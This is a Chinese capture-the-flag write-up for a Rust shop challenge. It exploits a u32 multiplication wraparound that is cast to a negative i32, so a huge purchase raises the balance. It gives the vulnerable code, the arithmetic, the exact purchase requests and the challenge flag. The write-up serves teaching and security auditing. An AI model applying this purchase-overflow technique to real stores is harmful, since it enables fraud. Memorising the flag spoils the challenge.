# cargo_shop

## 题目简述

题目实现了一个 Rust 商店。用户初始余额为 1000，flag 商品价格为 1,000,000,000；目标是利用购买逻辑中的整数回绕制造高额余额，买下 flag 商品后访问 `/flag`。

## 解题过程

商品价格和购买数量均为 `u32`，用户余额和最终价格却是 `i32`。关键代码为：

```rust
let costs = (goods.price * count) as i32;

if costs <= user.balance {
    user.balance -= costs;
    // 将商品加入 holds
}
```

程序以 release 模式编译时，`u32` 乘法溢出会按模 $2^{32}$ 回绕；随后使用 `as i32` 转换时，若最高位为 1，同一组 32 位数据会被解释成负数。只要让 `costs` 为负数，下面的余额更新就会变成“减去一个负数”，从而增加余额。

选择价格为 100 的 `tokio`，购买 203,333,333 个。乘积为：

$$
100\times203333333=20333333300
$$

先按 `u32` 回绕：

$$
20333333300\bmod 2^{32}=3153464116
$$

该值再解释为 `i32`：

$$
3153464116-2^{32}=-1141503180
$$

因此购买后余额变为：

$$
1000-(-1141503180)=1141504180
$$

按顺序发送请求：

```http
GET /purchase/tokio/203333333 HTTP/1.1
Host: TARGET
```

此时余额已经超过 flag 的价格，再购买一次 flag 商品并读取结果：

```http
GET /purchase/flag/1 HTTP/1.1
Host: TARGET

GET /flag HTTP/1.1
Host: TARGET
```

得到：

```text
0xGame{Rewrite_GoShop_in_Rust_cd57122cfed3}
```

## 方法总结

漏洞并非单纯的 `u32` 乘法溢出，而是“无符号乘法回绕 + 强制转换为有符号整数 + 用负数扣款”三步组合。审计价格、数量和余额逻辑时，应统一整数类型，并在乘法前检查上界；Rust 的内存安全也不会自动消除 release 模式下的算术逻辑漏洞。
